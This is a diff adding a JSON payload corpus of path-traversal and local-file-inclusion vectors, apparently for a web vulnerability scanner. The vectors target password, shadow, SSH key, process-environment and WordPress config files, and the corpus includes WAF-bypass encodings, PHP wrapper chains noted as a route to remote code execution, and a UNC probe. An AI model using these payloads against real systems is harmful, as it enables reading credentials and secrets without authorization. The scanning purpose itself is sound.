@@ -1,0 +1,2439 @@
+{
+  "version": "5.1.0",
+  "category": "path_traversal",
+  "payloads": [
+    {
+      "id": "lfi.unix.passwd_relative",
+      "vector": "../../../../etc/passwd",
+      "description": "Relative traversal to /etc/passwd.",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "owasp": "A01:2021",
+      "confidence": "LOW",
+      "severity": "High",
+      "expected_evidence": [
+        "root:x:0:0:",
+        "/bin/bash"
+      ],
+      "references": [
+        "https://swisskyrepo.github.io/PayloadsAllTheThings/Directory%20Traversal/"
+      ],
+      "tags": [
+        "passwd"
+      ]
+    },
+    {
+      "id": "lfi.unix.passwd_deep",
+      "vector": "../../../../../../../../etc/passwd",
+      "description": "Deeper relative traversal for nested webroots.",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "owasp": "A01:2021",
+      "confidence": "LOW",
+      "severity": "High",
+      "expected_evidence": [
+        "root:x:0:0:"
+      ],
+      "tags": [
+        "passwd"
+      ]
+    },
+    {
+      "id": "lfi.unix.passwd_absolute",
+      "vector": "/etc/passwd",
+      "description": "Absolute path where the app concatenates without a base dir.",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "owasp": "A01:2021",
+      "confidence": "LOW",
+      "severity": "High",
+      "expected_evidence": [
+        "root:x:0:0:"
+      ],
+      "tags": [
+        "absolute",
+        "passwd"
+      ]
+    },
+    {
+      "id": "lfi.unix.proc_self_environ",
+      "vector": "../../../../proc/self/environ",
+      "description": "Read the process environment (often leaks secrets/API keys).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "owasp": "A01:2021",
+      "confidence": "LOW",
+      "severity": "High",
+      "expected_evidence": [
+        "PATH=",
+        "HTTP_"
+      ],
+      "references": [
+        "https://medium.com/@instatunnel/path-traversal-2-0-escaping-containers-and-reading-etc-passwd-in-2025-809a45ccfe6a"
+      ],
+      "tags": [
+        "proc",
+        "secrets"
+      ]
+    },
+    {
+      "id": "lfi.unix.proc_self_cmdline",
+      "vector": "../../../../proc/self/cmdline",
+      "description": "Read the process command line.",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "owasp": "A01:2021",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "proc"
+      ]
+    },
+    {
+      "id": "lfi.unix.proc_self_fd",
+      "vector": "../../../../proc/self/fd/3",
+      "description": "Read an open file descriptor (upload/log race primitive).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "owasp": "A01:2021",
+      "confidence": "LOW",
+      "severity": "Medium",
+      "tags": [
+        "proc",
+        "fd"
+      ]
+    },
+    {
+      "id": "lfi.filterbypass.dot_slash_collapse",
+      "vector": "....//....//....//....//etc/passwd",
+      "description": "Non-recursive '../' stripping is defeated by '....//'.",
+      "context": "filter_bypass",
+      "cwe": "CWE-22",
+      "owasp": "A01:2021",
+      "confidence": "LOW",
+      "severity": "High",
+      "waf_bypass": true,
+      "tags": [
+        "dot-bypass"
+      ]
+    },
+    {
+      "id": "lfi.filterbypass.url_encoded",
+      "vector": "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+      "description": "Single URL-encoded traversal.",
+      "context": "url_encoded",
+      "cwe": "CWE-22",
+      "owasp": "A01:2021",
+      "confidence": "LOW",
+      "severity": "High",
+      "waf_bypass": true,
+      "tags": [
+        "single-encode"
+      ]
+    },
+    {
+      "id": "lfi.filterbypass.double_encoded",
+      "vector": "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+      "description": "Double URL-encoded traversal for filters that decode once.",
+      "context": "double_encoded",
+      "cwe": "CWE-22",
+      "owasp": "A01:2021",
+      "confidence": "LOW",
+      "severity": "High",
+      "waf_bypass": true,
+      "references": [
+        "https://en.wikipedia.org/wiki/Double_encoding"
+      ],
+      "tags": [
+        "double-encode"
+      ]
+    },
+    {
+      "id": "lfi.filterbypass.triple_encoded",
+      "vector": "%25252e%25252e%25252fetc%25252fpasswd",
+      "description": "Triple URL-encoded traversal.",
+      "context": "double_encoded",
+      "cwe": "CWE-22",
+      "owasp": "A01:2021",
+      "confidence": "LOW",
+      "severity": "High",
+      "waf_bypass": true,
+      "tags": [
+        "triple-encode"
+      ]
+    },
+    {
+      "id": "lfi.filterbypass.overlong_utf8",
+      "vector": "..%c0%af..%c0%af..%c0%afetc/passwd",
+      "description": "Overlong UTF-8 encoding of '/'.",
+      "context": "filter_bypass",
+      "cwe": "CWE-22",
+      "owasp": "A01:2021",
+      "confidence": "LOW",
+      "severity": "High",
+      "waf_bypass": true,
+      "tags": [
+        "overlong-utf8"
+      ]
+    },
+    {
+      "id": "lfi.filterbypass.double_encoded_slash",
+      "vector": "..%252f..%252f..%252fetc%252fpasswd",
+      "description": "Only the slashes double-encoded.",
+      "context": "double_encoded",
+      "cwe": "CWE-22",
+      "owasp": "A01:2021",
+      "confidence": "LOW",
+      "severity": "High",
+      "waf_bypass": true,
+      "tags": [
+        "double-encode"
+      ]
+    },
+    {
+      "id": "lfi.filterbypass.nullbyte",
+      "vector": "../../../../etc/passwd%00.png",
+      "description": "Null-byte truncation of an appended extension (legacy PHP < 5.3.4).",
+      "context": "filter_bypass",
+      "cwe": "CWE-22",
+      "owasp": "A01:2021",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "null-byte"
+      ]
+    },
+    {
+      "id": "lfi.windows.win_ini_relative",
+      "vector": "..\\..\\..\\..\\windows\\win.ini",
+      "description": "Windows relative traversal to win.ini.",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "owasp": "A01:2021",
+      "confidence": "LOW",
+      "severity": "High",
+      "expected_evidence": [
+        "[fonts]",
+        "for 16-bit app support"
+      ],
+      "tags": [
+        "win.ini"
+      ]
+    },
+    {
+      "id": "lfi.windows.unc_path",
+      "vector": "\\\\evil-webscanner-test.invalid\\share\\x",
+      "description": "UNC path to a marker host — outbound SMB/WebDAV attempt.",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "owasp": "A01:2021",
+      "canary": "evil-webscanner-test.invalid",
+      "confidence": "LOW",
+      "severity": "High",
+      "oob": true,
+      "tags": [
+        "unc",
+        "oob"
+      ]
+    },
+    {
+      "id": "lfi.php.filter_b64_index",
+      "vector": "php://filter/convert.base64-encode/resource=index.php",
+      "description": "php://filter wrapper to exfiltrate source as base64.",
+      "context": "php_wrapper",
+      "cwe": "CWE-22",
+      "owasp": "A01:2021",
+      "confidence": "LOW",
+      "severity": "High",
+      "engines": [
+        "php"
+      ],
+      "expected_evidence": [
+        "PD9waHA",
+        "<?php"
+      ],
+      "references": [
+        "https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it.html"
+      ],
+      "tags": [
+        "lfi",
+        "wrapper"
+      ]
+    },
+    {
+      "id": "lfi.php.filter_chain_marker",
+      "vector": "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=/etc/passwd",
+      "description": "php://filter iconv chain probe (basis for LFI->RCE without upload on PHP 7.4-8.x).",
+      "context": "php_filter_chain",
+      "cwe": "CWE-98",
+      "owasp": "A03:2021",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "min_intrusion_level": "medium",
+      "engines": [
+        "php"
+      ],
+      "references": [
+        "https://github.com/synacktiv/php_filter_chain_generator",
+        "https://hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-php-filters.html"
+      ],
+      "tags": [
+        "lfi2rce",
+        "filter-chain"
+      ]
+    },
+    {
+      "id": "lfi.php.data_uri",
+      "vector": "data://text/plain;base64,V1NTYzRuNHJ5Nzc4OA==",
+      "description": "data:// wrapper echo test (decodes to WSSc4n4ry7788).",
+      "context": "php_wrapper",
+      "cwe": "CWE-22",
+      "owasp": "A01:2021",
+      "canary": "V1NTYzRuNHJ5Nzc4OA==",
+      "confidence": "LOW",
+      "severity": "High",
+      "engines": [
+        "php"
+      ],
+      "tags": [
+        "wrapper",
+        "data-uri"
+      ]
+    },
+    {
+      "id": "lfi.scheme.file_unix",
+      "vector": "file:///etc/passwd",
+      "description": "file:// scheme.",
+      "context": "scheme",
+      "cwe": "CWE-22",
+      "owasp": "A01:2021",
+      "confidence": "LOW",
+      "severity": "High",
+      "expected_evidence": [
+        "root:x:0:0:"
+      ],
+      "tags": [
+        "file-scheme"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.01ab8f0f15",
+      "vector": "..%255c..%255c",
+      "description": "Imported from the legacy corpus (double_encoded).",
+      "context": "double_encoded",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ],
+      "waf_bypass": true
+    },
+    {
+      "id": "path_traversal.legacy.01f33c705b",
+      "vector": "../../wp-config.php",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.03ca79f969",
+      "vector": "..//..//",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.045ccdb4a7",
+      "vector": "..%c0%af..%c0%af..%c0%af",
+      "description": "Imported from the legacy corpus (double_encoded).",
+      "context": "double_encoded",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.0517f4b380",
+      "vector": "..\\..\\..\\..\\..\\",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.06061e9f18",
+      "vector": "../../../../etc/hosts",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.08d6a50f92",
+      "vector": "/usr/local/apache2/conf/httpd.conf",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.0aec7fe553",
+      "vector": "/var/www/html/",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.0c7afdfe74",
+      "vector": "....//....//....//",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.0fccc44f3d",
+      "vector": "..%2F",
+      "description": "Imported from the legacy corpus (url_encoded).",
+      "context": "url_encoded",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.0feb44881d",
+      "vector": "/proc/self/cwd/",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.11ed2e9a7a",
+      "vector": "../../../../../",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.132fd193c3",
+      "vector": "%2e%2e%2f%2e%2e%2f%2e%2e%2f",
+      "description": "Imported from the legacy corpus (url_encoded).",
+      "context": "url_encoded",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.147ddb4907",
+      "vector": "/proc/self/environ",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.1500b7cd10",
+      "vector": "..\\\\",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.1506fa35d5",
+      "vector": "..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.1807de137c",
+      "vector": "../../../etc/hosts",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.184be9582f",
+      "vector": "/proc/self/fd/1",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.1901c66595",
+      "vector": "../../../../windows/win.ini",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.1c0dd57f5a",
+      "vector": "php://input",
+      "description": "Imported from the legacy corpus (php_wrapper).",
+      "context": "php_wrapper",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.1d91d0eae4",
+      "vector": "\\..;\\",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.1ec34875d6",
+      "vector": "..;/..;/..;/",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.1ff63ba0b7",
+      "vector": "../../../../etc/shadow",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.20971c3ec8",
+      "vector": "..%c1%9c",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.217ea8445f",
+      "vector": "....\\\\....\\\\",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.21a02df378",
+      "vector": "..%c0%af..%c0%af",
+      "description": "Imported from the legacy corpus (double_encoded).",
+      "context": "double_encoded",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.255781a6bc",
+      "vector": "/etc/httpd/conf/httpd.conf",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.26c2e3becb",
+      "vector": "/./././",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.27adc2fd81",
+      "vector": "/root/.bash_history",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.2953342a04",
+      "vector": "../../../../../../etc/passwd%00.jpg",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.29c02a319f",
+      "vector": "~/.bashrc",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.2cfa5d4bd7",
+      "vector": "../windows/win.ini",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.2db439af1e",
+      "vector": "..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.30b66343aa",
+      "vector": "..\\\\..\\\\",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.318124ac55",
+      "vector": "/etc/passwd%00.jpg",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.31bf8d4b59",
+      "vector": "~/.ssh/id_rsa",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.323e3584c8",
+      "vector": "../../",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.324166cb65",
+      "vector": "/config/database.yml",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.330535ba85",
+      "vector": "../../../../../etc/shadow",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.33361ec77a",
+      "vector": "..\\..\\",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.336f1a0950",
+      "vector": "....//....//etc/passwd",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.388e9e8697",
+      "vector": "..../..../..../etc/passwd",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.394eb9f40d",
+      "vector": "\\..\\",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.3aec776544",
+      "vector": "/var/www/html/wp-config.php",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.3caa8ae207",
+      "vector": "..%2F..%2F..%2F",
+      "description": "Imported from the legacy corpus (url_encoded).",
+      "context": "url_encoded",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.3cb4669f20",
+      "vector": "..\\..\\..\\..\\..\\..\\..\\..\\",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.3d7f01750b",
+      "vector": "../../../etc/passwd",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.4157b53c18",
+      "vector": "..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\config\\sam",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.42104cc455",
+      "vector": "....\\\\....\\\\....\\\\",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.4293886d7c",
+      "vector": "..;/",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.449bc8f074",
+      "vector": "....//....//",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.45a10b5c6f",
+      "vector": "php://filter/convert.base64-encode/resource=../../../../etc/passwd",
+      "description": "Imported from the legacy corpus (php_wrapper).",
+      "context": "php_wrapper",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy",
+        "source:master"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.48742b3291",
+      "vector": "..\\..\\etc\\passwd",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.4c97f369f6",
+      "vector": "/etc/shadow%00",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.4d0286f92b",
+      "vector": "~/.ssh/authorized_keys",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.4e0938f010",
+      "vector": "..%5C..%5C..%5C..%5C..%5C",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.4ff389ee56",
+      "vector": "/etc/passwd%00",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.51b96027aa",
+      "vector": "/proc/self/fd/0",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.53808687e5",
+      "vector": "../../../windows/win.ini",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.56b058078e",
+      "vector": "/..",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.57e736fc84",
+      "vector": "/proc/cmdline",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.5839ba3b98",
+      "vector": "../../../../../../etc/shadow",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.5c56adde13",
+      "vector": "..\\..\\..\\",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.5ca2d564b0",
+      "vector": "..%252f",
+      "description": "Imported from the legacy corpus (double_encoded).",
+      "context": "double_encoded",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ],
+      "waf_bypass": true
+    },
+    {
+      "id": "path_traversal.legacy.5d504b0173",
+      "vector": "..\\..\\..\\..\\..\\..\\..\\",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.5ef67a9fd1",
+      "vector": "/etc/apache2/apache2.conf",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.614b4fba72",
+      "vector": "/wp-config.php",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.61eb8c6aa3",
+      "vector": "..\\..\\..\\..\\..\\..\\",
+      "description": "Imported from the legacy corpus (windows).",
+      "context": "windows",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.6258c76340",
+      "vector": "/proc/self/exe",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.63a2c3e838",
+      "vector": "/proc/net/tcp",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.648ce0eed4",
+      "vector": "../../../../../etc/passwd",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.6606878b0e",
+      "vector": "../../etc/hosts",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "path_traversal.legacy.68f6539baf",
+      "vector": "../../../../../../../etc/passwd",
+      "description": "Imported from the legacy corpus (unix).",
+      "context": "unix",
+      "cwe": "CWE-22",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
